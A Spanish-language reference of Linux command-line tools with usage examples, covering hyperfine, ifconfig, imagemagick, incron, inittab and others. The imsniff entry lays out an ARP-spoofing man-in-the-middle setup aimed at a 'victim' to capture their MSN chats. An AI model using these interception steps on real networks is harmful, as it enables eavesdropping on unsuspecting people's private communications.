Herramienta para medir y comparar el tiempo de ejecución de comandos de shell [benchmarking] desarrollada en Rust y que ofrece las siguientes características: Análisis estadístico en múltiples ejecuciones, compatibilidad con comandos de shell arbitrarios, ejecuciones de calentamiento antes del benchmark real, se pueden configurar comandos de borrado de caché antes de cada ejecución temporal, detección estadística de valores atípicos para detectar interferencias de otros programas y efectos de caché y exportación de resultados a varios formatos: CSV, JSON, Markdown, ASCII.
$ hyperfine 'sleep 1' (ejecuta el comando sleep 1 varias veces, por defecto, al menos 10 y muestra estadísticas del tiempo de ejecución)
$ hyperfine 'sleep 1' 'sleep 0.5' (compara el tiempo de ejecución de ambos comandos y lo muestra en una tabla)
$ hyperfine --min-runs 7 'ls -l' (ejecuta el comando al menos 7 veces)
$ hyperfine --warmup 5 'grep TODO *.txt' (realiza 5 ejecuciones de calentamiento antes de medir, útil para comandos afectados por cachés de disco)
$ hyperfine --prepare 'make clean' 'make' (ejecuta "make clean" antes de cada ejecución de "make", asegurando que cada medición parta de un estado limpio)
$ hyperfine --parameter-scan num_threads 1 8 'make -j {num_threads}' (ejecuta benchmarks de make -j 1 hasta make -j 8 para comparar el rendimiento con diferentes números de hilos)
$ hyperfine --export-json resultados.json 'sleep 1' (guarda los resultados del benchmark en formato JSON)
$ hyperfine --export-markdown resultados.md 'sleep 1' (guarda los resultados del benchmark en formato Markdown)
$ hyperfine --prepare 'sync; echo 3 | sudo tee /proc/sys/vm/drop_caches' 'grep -R TODO *' (limpia la caché de disco antes de cada ejecución para medir el rendimiento en con caché fría)


hyperspec
Este es un paquete de instalación para la versión HTML del estándar ANSI de Common Lisp. Estas páginas son solo para información y no sirven como referencia. Sin embargo, a efectos prácticos, esta es una referencia suficiente para el trabajo diario. Se accede al índice con el navegador en file:///usr/share/doc/hyperspec/Front/


i2p
El Proyecto Internet Invisible es una capa de red privada, anónima, descentralizada totalmente encriptada y construida usando Java con principios similares a Tor, pero que fue diseñada desde cero como una red oscura autónoma. Protege la actividad y localización y sin problemas de que rastreen o recopilen datos. I2P oculta el servidor al usuario y el usuario al servidor. Todo el tráfico I2P es interno a la red I2P. El tráfico dentro de I2P no interactúa directamente con Internet. Es una capa superior a Internet. Utiliza túneles unidireccionales encriptados entre usted y sus pares. Nadie puede ver de dónde viene el tráfico, a dónde va o cuál es su contenido. Además, I2P ofrece resistencia al reconocimiento de patrones y al bloqueo por parte de los censores.


i2util-tools
Herramienta que proporciona utilidades auxiliares que son utilizadas por otras herramientas relacionadas con la medición y gestión del rendimiento de redes. Incluye las herramientas aespasswd y pfstore
$ aespasswd -f keys.txt juan (generará una clave cifrada para el usuario juan y lo almacenará en el archivo .txt que tiene que existir)
$ pfstore -f keys.txt -n juan (pedira contraseña y almecenara nombre usuario y clave cifrada en el .txt que si no existe lo creará))
Nota.- i2util-tools proporciona herramientas principalmente diseñadas para ser usadas junto con otras herramientas más grandes de Internet2 [bwctl, owamp, perfsonar]. Por sí solas no hacen mucho, pero son fundamentales cuando trabajas en monitoreo de redes académicas o de alto rendimiento.


i7z
Herramienta que muestra datos en tiempo real sobre cada core en los procesadores Intel Core i3, i5 o i7.
# i7z


i8kutils
Es una colección de utilidades para controlar los ventiladores de los portátiles Dell. Incluye programas para encender, apagar y modificar el estado y velocidad los ventiladores, leer su estado, la temperatura de la CPU y la versión del BIOS.
$ i8kctl (mostrar toda la información disponible)
$ i8kctl temp (consultar la temperatura de la CPU)
$ i8kctl fan (ver el estado de los ventiladores, primer número: estado del ventilador izquierdo, el segundo del derecho [0=apagado, 1=baja velocidad, 2=alta velocidad])
$ i8kctl fan 2 - (poner el ventilador izquierdo en alta velocidad y dejar el derecho sin cambios)
$ i8kctl fan - 2 (poner el ventilador derecho en alta velocidad y dejar el izquierdo sin cambios)
$ i8kctl fan 1 1 (poner ambos ventiladores en baja velocidad)
$ i8kctl fan 0 0 (apagar ambos ventiladores, no recomendado)
$ i8kctl bios (consultar versión del BIOS)
$ i8kctl id (ID de máquina)
$ i8kctl speed (velocidades de los ventiladores en RPM)
Nota.- Con el demonio i8kmon corriendo, cualquier cambio manual con i8kctl fan será sobrescrito automáticamente por el demonio según la temperatura del sistema. El comando también puede usarse como i8kfan, que es equivalente a i8kctl fan.


iat
Herramienta que convierte ficheros de imagen de CD, DVD, etc a formato iso ISO9660. Puede convertir a ISO desde los siguientes formatos: BIN, MDF, PDI, CDI, NRG y B5I.
$ iat imagen.bin imagen.iso


ibacm
[InfiniBand Address and Connection Manager]. Implementa y proporciona un marco para servicios de resolución de nombres, direcciones y rutas sobre InfiniBand. Su objetivo es abordar problemas de escalabilidad en la configuración de la conexión al ejecutar aplicaciones MPI en clústeres grandes. InfiniBand [IB] es un estándar de comunicaciones de redes informáticas utilizado en informática que ofrece un alto rendimiento y una latencia muy baja. Se utiliza para la interconexión de datos entre ordenadores y dentro de ellos.
# systemctl start ibacm (iniciar el servicio que normalmente se ejecuta como demonio)
# ibacm (otra forma de lanzar el demonio que escucha en el socket Unix /var/run/ibacm.sock)
El archivo de configuración básico:
# nano /etc/rdma/ibacm_opts.cfg
        interfaces=ib0
        provider=verbs
        log_file=/var/log/ibacm.log
Interfaces de red a usar [interfaces], proveedores RDMA a usar [provider], ruta de logs
Nota.- Las aplicaciones no invocan ibacm directamente. Lo usan indirectamente a través de aplicaciones que empleen RDMA como Open MPI, Intel MPI, etc. Tambien se puede forzar eñ uso del servicio activando la variable de entorno:
$ export IBACM_ENABLE=1
$ lsof -U | grep ibacm (verificar si el servicio está activo)


ibam
Monitor de carga de la bateria
$ ibam -a


ibmonitor
Muestra el tráfico total por interfaz, tanto el enviado como el recibido. Descarga: <http://ibmonitor.sourceforge.net/download.html>
$ ./ibmonitor
$ ./ibmonitor --bytes --max --avg --data (Los valores de salida en KBytes/seg, los máximos por interfaz y datos transferidos)


ibsim-utils
Herramientas para simular una red InfiniBand, útil para probar configuraciones y diagnósticos sin necesidad de hardware físico.
$ ibsim -n my_ib_network -s 0 (crea una simulación llamada my_ib_network y escucha en el puerto predeterminado)
$ ibssendtopo -f topology.dot -n my_ib_network (carga la topología descrita en .dot en la simulación my_ib_network)
$ ibnodes -l (muestra los nodos de la red simulada)
$ ibdiagnet --simulate -n my_ib_network (verifica la conectividad y configuración de la subred simulada)
$ ibnetdiscover -s -n my_ib_network (genera un mapa de la topología simulada)
$ opensm -F /etc/opensm/opensm.conf -s test_ib (probar con OpenSM)


ibus
Utilidad en línea de comandos que puede reiniciar o salir de ibus-daemon, obtener o configurar el motor ibus actual o enumerar los motores ibus.
$ ibus engine (obtiene el motor ibus)
$ ibus list-engine (muestra los disponibles)
$ ibus restart (reiniciar el daemon)
$ ibus start (arrancar el daemon)
$ ibus exit (salir de ibus daemon)
$ ibus address (muesttra la dirección D-bus del daemon ibus)
$ ibus reset-config (restablece los valores de la configuración)


ibutils
Conjunto de herramientas de diagnóstico y análisis que permiten inspeccionar y depurar el estado de la topología InfiniBand, conexiones, rutas, errores, etc.  Incluye las herramientas ibdiagnet, ibdiagpath, ibdiagui, ibdmchk, ibdmsh, ibdmtr, ibis, ibnlparse y ibtopodiff.
$ ibdiagnet -r (recorre toda la topología y genera reportes detallados sovre errores, links caídos, puertos inactivos, conflictos de GUIDs, etc)
$ ibdiagnet -o /tmp/diag (diagnosticar la red y obtener topología)
$ ibdiagpath -s <src_guid> -d <dst_guid> (muestra las rutas utilizadas en la red para ir de un nodo a otro)
$ ibdiagui (visualización gráfica de la topología)
$ ibdmchk -t file.topo (compara una topología esperada con la real)
$ ibdmsh (interfaz de shell para manipulación de datos de topología [ejecutar comandos] usado principalmente por scripts)
$ ibtopodiff old.topo new.topo (compara dos salidas de ibdiagnet o archivos .topo)


ical2html
Crear una tabla HTML a partir de datos de iCalendar [formato .ics]. ical2html toma un archivo iCalendar y genera un archivo HTML que muestra uno o más meses en forma de tablas. Este paquete contiene las siguientes utilidades de línea de comandos:
$ ical2html archivo.ics > calendario.html (toma un archivo .ics y genera un archivo HTML con la visualización de los eventos en tablas mensuales)
$ icalfilter '/>-1m/' archivo.ics > filtrado.ics (eliminar eventos antiguos de más de un mes)
$ icalfilter '/=+0w/;:expand;/=+0w/t' archivo.ics (filtra y muestra solo los eventos de la semana en curso)
$ icalfilter -e 's/SUMMARY/Busy/;/DTSTART|DTEND|SUMMARY/f' archivo.ics > ocupado.ics (reemplaza el resumen de cada evento por "Busy" y deja solo los campos de inicio, fin y resumen)
$ icalmerge archivo1.ics archivo2.ics > combinado.ics (genera un nuevo archivo .ics con todos los eventos de ambos archivos, eliminando duplicados según la fecha más reciente)


icatalan
Diccionario catalán por ispell [ver]


icdiff
Parecido a diff [ver], pero en lugar de tratar de ser un reemplazo de diff para todas las circunstancias, el objetivo de icdiff es ser una herramienta que pueda alcanzar para obtener una mejor idea de lo que cambió cuando no es inmediatamente obvio desde diff.
$ icdiff -N archivo archivo1 (mostrando el número de linea)


iceauth
Se utiliza para editar y mostrar la información de autorización utilizada en la conexión con Internet Communications Engine [ICE] que se trata de marco RPC orientado a objetos que ayuda a crear aplicaciones distribuidas con un esfuerzo mínimo. Este programa generalmente se usa para extraer registros de autorización de una máquina y fusionarlos en otra (como es el caso cuando se usan inicios de sesión remotos o se otorga acceso a otros usuarios). Los comandos se pueden ingresar de forma interactiva, en la línea de comandos de iceauth o en scripts.
$ iceauth -v (entrar en el prompt y mostrar mensajes detallados, "q" para salir del prompt)


icnsutils
Permite extraer imágenes PNG desde archivos .icns [formato de iconos de macOS] y también crear archivos .icns a partir de imágenes PNG. Incluye las herramientas icns2png y png2icns.
$ icns2png -x mi_icono.icns (extrae todas las imágenes del archivo "mi_icono.icns" a archivos PNG individuales en el directorio actual)
$ icns2png -l mi_icono.icns (listar los tamaños incluidos en el icns)
$ png2icns icono.icns icono_16.png icono_32.png icono_128.png (generará el archivo "icono.icns" utilizando los archivos PNG proporcionados)


ico
Muestra poligonos en movimiento en la terminal.
$ ico -faces -colors red -sleep 0.5 (poligono conpacto rojo moviendose cada medio segundo)
$ ico -colors red -sleep 0.5 -bg yellow (poligono solo con aristas rojo y fondo amarillo)


iconv
Modificar la codificación de un archivo. Para saber la codificación de un archivo $ file --mime-encoding archivo.txt
$ iconv -l   (Muestra todas las opciones posibles)
$ iconv -f ISO85591 -t UTF8 viejo.txt -o nuevo.txt (Pasar viejo.txt de codificación ISO-8559-1 a UTF-8 en el nuevo.txt)


icoutils
Herramientas de línea de comandos diseñadas para extraer, crear y manipular iconos y cursores de Windows [archivos .ico, .cur, y también recursos embebidos dentro de archivos .exe o .dll]. Incluye los ejecutables extresso, genresscript, icotool y wrestool
$ wrestool -l programa.exe (listar todos los recursos en un .exe)
$ wrestool -x --type=group_icon -o iconos/ programa.exe (extraerá todos los grupos de iconos y los guardará en la carpeta iconos/)
$ wrestool -x --type=group_cursor -o cursores/ programa.exe (extraer cursores)
$ wrestool -x --type=group_icon --name=101 -o icono101.ico programa.exe (extraer un recurso específico por ID)
$ icotool -x icono.ico (generará archivos como icono_0.png, icono_1.png etc., uno por cada tamaño/formato dentro del .ico)
$ icotool -c -o nuevo_icono.ico imagen32.png imagen16.png imagen48.png (crear un archivo `.ico a partir de varios PNG. El orden no importa; icotool organiza automáticamente por tamaño)
$ icotool -c --cursor -o puntero.cur cursor_hotspot_32.png (crear un cursor .cur)
Nota.- Los cursores requieren un "hotspot" [punto de clic]. Si no se especifica, usa [0,0]. Se puede usar "--hotspot=X,Y".
$ extresso programa.exe (extraer todos los recursos de un .exe. Crea una carpeta programa.exe.dir/ con subcarpetas como: group_icon/, group_cursor/, bitmap/, dialog/, etc.)
$ genresscript programa.exe.dir > recursos.rc (generar script .rc a partir de una carpeta de recursos)


icp
[renameutils]. Igual que imv[ver], pero copia los archivos en lugar de moverlos.
$ icp dir/archivo.txt


icuinfo
imprime información básica sobre la versión actual de ICU.
$ icuinfo -m (Imprime la hora UTC actual en milisegundos)
$ icuinfo -k (Llama a u_cleanup antes de salir e intentará descargar complementos)


id
Conocer el uid y el gid del usuario especificado
$ id root
$ id -u (Del usuario no root)
$ id -a (De todos los grupos a los que pertenece el usuario)
$ id -un (Muestra el usuario con el que estamos)


identify
[imagemagick]. Ver las propiedades de una imagen
$ identify imagen.gif
$ identify -verbose imagen.jpg   (Con mucha más información)
$ identify -format %c imagen.png (Visualizar los comentarios)


idesk
Herramienta para la creación de iconos en el escritorio. Los archivos con extensión .lnk se colocan en el directorio ~/.idesktop. Una muestra:
$ nano .idesktop/home.lnk
	table Icon
	  Caption: Home
	  Command[0]: thunar /home/usuario
	  Icon: /usr/share/idesk/folder_home.xpm
	  Width: 48
	  Height: 48
	  X: 29
	  Y: 39
	end
Nombre del icono [Caption], El comando que se lanzará [0] con doble click izquierdo del ratón. Con [1], doble click derecho, en este caso thunar abrirá la carpeta personal [Command], la ruta al icono que se empleará [Icon], las medidas ancho [Width] y alto [Height] y la colocación en pantalla, x: distancia en pixels del lateral, y: distancia en pixels de la parte superior.
Otros parámetros [fuentes, colores, medidas, fondos, transparencias...] pueden configurarse en el archivo ~/.ideskrc. Cualquier modificación en idesktop o ideskrc precisa matar el proceso:
$ killall idesk
Y relanzarlo:
$ idesk


iecset
Muestra el estado actual de IEC958 en una forma legible para humanos. Cuando se dan los comandos en los argumentos, se analizan y se actualizan los bits de estado IEC958. El estado resultante se muestra también.
$ iecset -x (Muestra los bits de estado actuales de IEC958 en estilo de los argumentos para el flujo PCM)
$ iecset pro off audio off (Establece el estado actual y activa el bit que no es de audio. También se mostrará el estado modificado)


if
Ejecuta uno o varios comandos dependiendo de si una condición se cumple o no. Algunos scripts de ejemplo para su uso [ver operadores]:
1.-
	#!/bin/bash
	read -p "Ingrese nombre del usuario: " USUARIO
	if grep -e ^$USUARIO: /etc/passwd
	then
	 	echo "El usuario existe en el sistema"
	else
		echo "Usuario desconocido"
	fi
	exit 0
2.-
	#!/bin/bash
	if [ "$(id -u)" != "0" ]; then
		echo "Solo root puede ejecutar este script."
		exit 1
	fi
3.-
	#!/bin/bash
	# Verificar si se ha entrado un argumento
	if [ -z "$1" ]
	then
		      echo "Falta el argumento después del nombre del script"
	exit
	fi
4.-
	#!/bin/bash
	# Introducir dos números diferentes e indicar
	# cuál es el mayor
	read -p "Introduce dos números: " A B
	if [ $A -gt $B ]
	then
		    echo $A "es el mayor"
	else
		    echo $B "es el mayor"
	fi
5.-
	#!/bin/bash
	#Con varias opciones [elif]
	ls
	echo
	read -p "Cual leer: " LEER
	echo
	if [ -f $LEER ]
	then
		echo
		cat $LEER
		echo
	elif [ -d $LEER ]
	then
		echo
		echo "Es un directorio...."
	else
		echo
		f_echo "¡¡NO EXISTE!!"
		echo
	fi
6.-
	#!/bin/bash
	echo "Diga si o no:"
	read RESPUESTA
	if  [ "$RESPUESTA" = si ]; then
		echo "Has escrito si"
	elif [ "$RESPUESTA" = no ]; then
		echo "Has escrito no"
	elif [ "$RESPUESTA" = "" ]; then
		echo "No has escrito nada"
	else
		echo "Has escrito una cosa no permitida"
	fi
7.-
	#!/bin/bash
	# and y or como condicional
	echo
	if [[ -f ~/.bashrc ]] && [[ -r ~/.bashrc ]]
	then
	    echo "Existe y se puede leer"
	fi
	#
	if [[ 4 -lt 3 ]] || [[ 7 -eq 7 ]]
	then
	    echo "Uno de los dos es verdadero"
	fi
8.-
	#!/bin/bash
	# Comprobar si un directorio está vacio
	DIR=~/docs
	#
	if [ "$(ls -A $DIR)" ]
		then
    	echo "Contiene archivos"
	else
        echo "Vacio (o no existe o es un archivo)"
	fi


ifconfig
[net-tools]. Define direcciones ip y dispositivos de red.
# ifconfig (ver los datos de conexión)
# ifconfig eth0 up 192.168.1.2 (Levanta la placa de red eth0 y le da la ip)
# ifconfig eth0 down (Cierra la red eth0)
# ifconfig eth0 promisc (Poner la placa en modo promiscuo)
# ifconfig wlan0 up (si se trata de redes inalámbricas)
# ifconfig eth0 hw ether 00:01:02:03:04:05 (cambiar la dirección MAC)


ifdata
[moreutils]. Muestra información de la red.
$ ifdata -p eth0 (muestra la ip local, la mascara de red, la dirección broadcast y los MTU de la red)
$ ifdata -pa -pn eth0 (muestra la ip local i la mascara de red)
$ ifdata -pe eth5 (muestra "yes" o "no" sobre si existe o no la red especificada)
Otras opciones:
-pb (la dirección broadcast)
-ph (muestra la MAC)
-pf (muestra las caracteristicas de la red)


ifdown
[ifupdown]. Deshabilita la interfase especificada:
# ifdown eth0
# ifdown -a (Deshabilita todas las redes)


ifmetric
Permite Cambiar la prioridad de enrutamiento.
# ifmetric wlan0 1 (Dar a todas las demás interfaces una prioridad más alta que wlan0)
# ifmetric wlan0 0 (restablecer las prioridades)


ifnames
Escanear archivos fuente en C (o la entrada estándar, si no se proporciona ninguno) y mostrar por pantalla una lista ordenada de todos los identificadores que aparecen en esos archivos en las directivas "#if", "#elif", "#ifdef" o "#ifndef". Imprime cada identificador en una línea, seguido de una lista separada por espacios de los archivos en los que aparece ese identificador.
$ ifnames file.c


ifne
[moreutils]. Se ejecuta si la entrada estandar no está vacia.
$ find . -name archivo | ifne echo "Existe" (Si "archivo" existe se ejecutará el echo. Si no existe, no)
$ find . -name archivo | ifne -n echo "No existe" (Si "archivo" no existe se ejecutará el echo. Si existe, no)


ifplugd
Es un demonio que configura automáticamente un dispositivo ethernet cuando se conecta un cable y lo desconfigura automáticamente si se extrae el cable.
# ifplugstatus


ifplugstatus
[ifplugd]. Indica todos los dispositivos conectados al pc.
# ifplugstatus (de todos)
# ifplugstatus eth0 (el especificado)


ifquery
Lista rápida de interfaces de red.
$ ifquery -l (Muestra las especificadas en /etc/network/interfaces y el orden en que se levantarán)
$ ifquery --state (Muestra el orden en que se levantaron según /run/network/ifstate)
$ ifquery enp1s0 (muestra información de la interface especificada)


ifrename
Permite al usuario decidir qué nombre tendrá una interfaz de red.
# ifrename -i eth0 -n Nuevo_nombre


ifs
Internal Field Separator (separador de campos internos) sirve para indicar cual es el valor que se usa como separador. Si no se especifica ninguno es el espacio.
Algunos ejemplos:
1.-
	#!/bin/bash
	# dividir una IP en 4 variables
	# Guardar el separador de campos original
	OLDIFS=$IFS
	read -p "Dime la ip: " IP
	# Establecemos el separador de campos en el punto
	IFS=.
	read IP1 IP2 IP3 IP4 <<< "$IP"
	echo "$IP1 $IP2 $IP3 $IP4"
	# Restablecemos el separador original (El espacio)
	IFS=$OLDIFS
2.-
	#!/bin/bash
	#Almacenamos el valor original de la variable IFS
	OLDIFS=$IFS
	#Cambiamos el valor del IFS a final de linea [\n]
	IFS=$'\n'
	for line in $(cat file.txt)
	do
		echo $line
	done
	#Restauramos el IFS
	IFS=$OLDIFS


ifstat
Monitorización del trafico de red.
$ ifstat -z (Descarta los interfaces sin actividad)
$ ifstat -i eth1 (Especificando una red)
Algunas opciones:
-a (Muestra todas las redes)
-T (monitorizando varias redes, muestra el total)
-S (Muestra los resultados en la misma linea, si es posible)
-b (Reporta los informes en Kbits / seg en lugar de kbytes / seg.)


iftop
Muestra el ancho de banda que está usando una red.
# iftop -nP -i eth0 (sin resolver las IPs[n], mostrando puerto[P] y especificando red)


ifup
[ifupdown]. Habilita la interfase especificada:
$ ifup eth0
$ ifup -a (levanta las especificadas en /etc/network/interfaces)


imageindex
Generar una galerías de imágenes en HTML estáticas de un directorio. Se generan miniaturas y puede personalizarse con hojas de css. Crear el archivo .imageindexrc
$ nano .imageindexrc
con un contenido que puede personalizarse como indica su página man:
	$framedateformat = "%D";
	$frametimeformat = "%R";
	$indexdateformat = "%D";
	$indextimeformat = "%R";
	$slidedateformat = "%D";
	$slidetimeformat = "%R";
	$detaildateformat = "%m/%y";
	$default_titletext  = "Directorio de imágenes";
	$indexlinktext = "indice";
	$detaillinktext = "detalles";
	$framelinktext = "slideshow view (frames)";
	$stylesheet = '
            body { color: black; background: gray; }
	'
Algunas notas al respecto:
	%D (que las fechas sean dia, mes, año)
	%R (horas y minutos)
	$default_titletext (el título)
	$indexlinltext (en castellano)
	$detaillinktext (en castellano)
	$stylesheet (el fondo [background] gris. colocar otros ajustes entre los apóstrofes)
Entrar en el directorio donde estan las imagenes y lanzar:
$ imageindex (buscará todas las imágenes en el directorio actual y creará una galería)
$ imageindex Images/verano_2025 (especificandoun directorio de imágenes y donde se generará los subdirectorios y archivos de la aplicación)
$ imageindex --title "Verano del 2025" (especificando título)
Visualizar el index.html creado en el navegador.


imagemagick
Paquete de software que se utiliza para editar y manipular imágenes digitales. Se puede utilizar para crear, editar, componer o convertir imágenes y admite una amplia gama de formatos de archivo: JPEG, PNG, GIF, TIFF,  PDF... Incluye varias aplicaciones: animate, compare, composite, conjure, convert, display, identify, import, mogrify, montage y stream


img2txt
[caca-utils, libcaca]. Pasar una imagen a ascii.
$ img2txt imagen.png (forma básica)
$ img2txt -f svg imagen.jpg > imagen.svg
$ img2txt -f html imagen.jpg > imagen.html (código html de la imagen)


impala
Gestionar conexiones Wi-Fi. Descargar de https://github.com/pythops/impala.
$ impala (muestra una lista de las redes Wi-Fi detectadas)
Para navegar por la lista:
flechas arriba/abajo para moverse por la lista
Enter para seleccionar
d --> desconectar la red actual
? --> mostrar todos los atajos de teclado.


import
[imagemagick]. Capturar la pantalla en cualquier formato.
$ import -window root captura.png (captura de pantalla completa)
$ import -window `xwininfo | awk '/Window id/{print $4; exit}'` `uuidgen`.png (Lo mismo. El puntero se convierte en una cruz y captura el escritorio donde se clica)
$ import -frame -strip -quality 75 "$HOME/$(date +%s).png" (seleccionar el trozo a capturar)
$ import captura.png (captura de un área concreta))
$ import 2 captura.png (realizar 2 capturas)
$ import -pause 5 captura.png (Para retardar la captura 5 segundos)
$ import -geometry 250×250! captura.png (indicando un tamaño respetando las proporciones)


impressive
Visualizar documentos PDF e imágenes (jpg, tiff, png...)
$ impressive archivo.pdf (uso basico)
$ impressive -f -g 800x600 archivo.pdf (Sólo ocupando una ventana de la pantalla
$ impressive -f -g 800x600 *.jpge todos los jpg del directorio)
$ impressive -a 5 -w archivo.pdf (5 segundos por diapositiva y reiniciando la presentación cuando termine)
$ impressive -i 10 archivo.pdf (empezando en la página 10)
$ impressive --invert archivo.pdf (invirtiendo los colores existentes en el pdf)
$ impressive -p 10-12 archivo.pdf (Sólo mostrar de las páginas 10 a la 12)
$ impressive -l (lista efectos disponibles)
$ impressive -t SqueezeLeft documento.pdf
Algunas opciones:
AvPág (Va a la página siguiente)
RePág (Va a la página anterior)
z (zoom donde esté el cursor)
f (Activa/Desactiva la pantalla completa)
tab (mostrar miniaturas)
q (Salir de la aplicación)


imsniff
Capturar paquetes relacionados con el protocolo MSN . Su uso pasa por el envenenamiento arp, situando nuestra máquina entre la victima y el router lanzando en varias terminales y sin cerrarlas:
# arpspoof -i eth0 -t 192.168.1.15 192.168.1.1
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.15
Activar forwarding para que los paquetes vayan a su verdadero dueño:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Crear una carpeta donde guardar los datos:
$ mkdir snifadas
Modificar el archivo de configuración a partir de la  propia documentación ::
# cp /usr/share/doc/imsniff/examples/imsniff.conf.sample /etc/imsniff.conf
# nano /etc/imsniff.conf
daemonize = 0
promisc = 0
verbose = 2
chatdir = /home/USER/snifadas/chats
debugdir = /home/USER/snifadas/debug
interface eth0
Los directorios "chats" y "debug" los crea la misma aplicación.
Lanzar el sniffer de conversaciones msn:
# imsniff


imv
[renameutils]. Permite renombrar interactivamente los nombres de los archivos uno por uno.
$ imv dir/archivo.txt


inadyn
Cliente que actualiza registros DNS de ips dinámicas tipo noip2 [ver].
# nano /etc/inadyn.conf
Y, para el caso de un registro no-ip, modificar los parámetros:
	system default@no-ip.com
	username Nombre_de_registro_en_no-ip
	password Contraseña_del_registro_de_no-ip
	alias Tu_host.no-ip.org
El periodo de actualización en segundos:
	period 600
Si existen errores se mostrarán la lanzar:
# inadyn


incron
Monitorizar los cambios realizados en un directorio del sistema lo cual se refleja en /var/log/messages [tail -f /var/log/messages]. La configuración global y el monitoreo se realiza en /etc/incron.conf. Igual que con crontab [ver] puede abrirse como usuario normal o root [crontab -e]. Para arrancar el servicio:
# service incron start
Añadir las lineas de los archivos o directorios a monitorizar según los ejemplos siguientes en /etc/incron.conf
	/home/USER/dir1 IN_MODIFY echo "$$ $@ $# $% $&" (datos ha indicar si se modifica dir1)
	/etc/apache2/apache2.conf IN_MODIFY /usr/sbin/service apache2 stop (si se modifica apache2.conf parar el servicio)
	/home/USER/Documentos IN_ACCESS,IN_OPEN mplayer /home/USER/musica/cancion.mp3 (reproducir mp3 si alguien accede a un directorio)
	/var/www/html IN_CREATE script_backup.sh (ejecutar un script si se crea un nuevo archivo o directorio en html)
	/home/USER/emacs_tut.txt IN_MODIFY echo "$$ $@ $# $% $&" (si se ha modificado un fichero)
Opciones de monitoreo de los archivos o directorios:
    IN_ACCESS - Si se accedió a él.
    IN_ATTRIB - Si se actualizó información.
    IN_CLOSE_WRITE - Si se abrió para escritura y fue cerrado.
    IN_CLOSE_NOWRITE - Archivo abierto fue cerrado.
    IN_CREATE - Si se creo algún archivo o directorio.
    IN_DELETE - Si se borró algún archivo o directorio.
    IN_DELETE_SELF - Si se ha eliminado el archivo o el directorio.
    IN_MODIFY - Si un archivo fue modificado.
    IN_MOVE_SELF - Si se ha movido el archivo o el directorio.
    IN_MOVED_FROM - Si se movio algún archivo de este directorio a otro.
    IN_MOVED_TO - Si se movió algún archivo de otro directorio al presente
    IN_OPEN - Si un archivo fue abierto.
    IN_ALL_EVENTS - Todos los eventos anteriores.
Significados de algunos datos que pueden incorporarse en el informe en /var/log/messages:
	$$ (Imprimir un signo de dólar literalmente)
	$@ (Agregar la ruta del sistema de archivos supervisados)
	$# (Agregar el nombre del archivo)
	$% (Agregar indicadores de eventos)


inetutils-traceroute
La utilidad traceroute [ver] muestra la ruta tomada por los paquetes IP en su camino a otro host u otra red. Esta herramienta permite examinar la conectividad de red o para diagnosticar problemas de red.
$ inetutils-traceroute --resolve-hostnames lapipaplena.org (resolviendo los hostnames de la ruta)


info
Páginas de manual para la mayoria de programas del proyecto GNU con una estructura jerarquizada. Ligeramente más complejo que las clásicas páginas man  [ver]
$ info (MUestra la lista de los nodos disponibles en el primer nivel)
$ info ifconfig


info2man
Generar páginas de manual a partir de documentos de información como los que se almacenan en /usr/share/info. Incluye la aplicación info2pod [Plain Old Documentation].
$ info2pod /usr/share/info/nano.info.gz > nano.txt
$ info2man /usr/share/info/nano.info.gz > nano.txt


info2www
Permite leer archivos info, tipicamente ubicados en /usr/share/info/, comúnmente utilizados para la documentación de software en sistemas GNU/Linux con un navegador web. Requiere un servidor HTTP compatible con CGI [Common Gateway Interface]. Se accede al indice general con la dirección http://localhost/cgi-bin/info2www
# a2enmod cgi (habilitar el módulo CGI si no está habilitado)
# systemctl restart apache2 (reiniciar el servidor)
Para buscar un comando especifico:
http://localhost/cgi-bin/info2www?grep
Es equivalente a:
$ info grep


infocmp
Herramienta que se utiliza para comparar o mostrar información sobre descripciones de terminal en sistemas que utilizan el sistema de gestión de terminales terminfo.
$ toe -a -s (muestra el listado de descripciones de terminal disponibles. Más de 1800)
$ infocmp (muestra la descripción completa de la terminal actual)
$ infocmp vt100 (mostrar información sobre el tipo de terminal vt100)
$ infocmp -d vt220 xterms-sun
$ infocmp -u xterm-256color (descripción de la fuente terminfo del primer terminal)
$ infocmp -C ibm3101 (salida en formato termcap)
$ infocmp -L xterm-256color (mostrar información en formato legible de la terminal especificada)


init
Para o reinicia el sistema
$ init 0 (parar)
$ init 1 (reinicia en modo uniusuario)
$ init 6 (reinicia)


initramfs
Problemas durante el arranque. Consiste en un fallo de lectura de los controladores ide de discos duros por parte del kernel del sistema operativo que no logra reconocer dichos drivers. Arrancar con un livecd o pulsando “e” para editar la opción cuando salga el menu en grub:
# gedit /boot/grub/menu.lst
Y al final de la linea del kernel poner: rootdelay=90
Otras soluciones propuestas (sustituir el rootdelay=90 por):
pci=nomsi
all_generix_ide
Para actualizar initramfs y que el kernel aplique los cambios:
# update-initramfs -u


inittab
Fichero que gestiona el inicio del sistema o un cambio de estado (runlevel) con el comando init (ver).
# nano /etc/inittab
Especificación de si el sistema arranca en modo monousuario (1) o multiusuario (2-5). Por defecto 2 o 3:
	id:2:initdefault:
Scripts que se ejecutarán en el inicio y en el orden que lo harán independientemente del runlevel:
	si::sysinit:/etc/init.d/rcS (En algunas distros si::sysinit:/etc/rc.d/rc.sysinit)
Este script llama a los scripts del directorio /etc/rcS.d. Por cada runlevel se ejecutan los scripts del directorio correpondiente: rc0.d/, rc1.d/, rc2.d/, rc3.d/, rc4.d/, rc5.d/, rc6.d/, rc.local y rcS.d/. El directorio /etc/rc.local se usa para ejecutar servicios porpios del usuario. En estos directorios los scripts que empiezan por una "K" paran servicios y los que empiezan por una "S" los arrancan.
Qué hacer si se presiona CTRL-ALT-DEL:
	ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now
Qué hacer si la corriente se va/vuelve
	pf::powerwait:/etc/init.d/powerfail start
	pn::powerfailnow:/etc/init.d/powerfail now
	po::powerokwait:/etc/init.d/powerfail stop
Despues de ejecutar los scripts de inicio, init crea un conjunto de terminales virtuales:
	1:2345:respawn:/sbin/getty 38400 tty1
	2:23:respawn:/sbin/getty 38400 tty2
	3:23:respawn:/sbin/getty 38400 tty3
	4:23:respawn:/sbin/getty 38400 tty4
	5:23:respawn:/sbin/getty 38400 tty5
	6:23:respawn:/sbin/getty 38400 tty6
Utilizando la opción respawn, si alguien trata de finalizar uno de estos procesos, el proceso simplemente será regenerado (respawned).
1.-
Entrar de forma automática:
Comentar la siguiente línea
#1:2345:respawn:/sbin/getty 38400 tty1
Y Agrega la siguiente linea:
1:2345:respawn:/bin/login -f USUARIO tty1 </dev/tty1 >/dev/tty1 2>&1
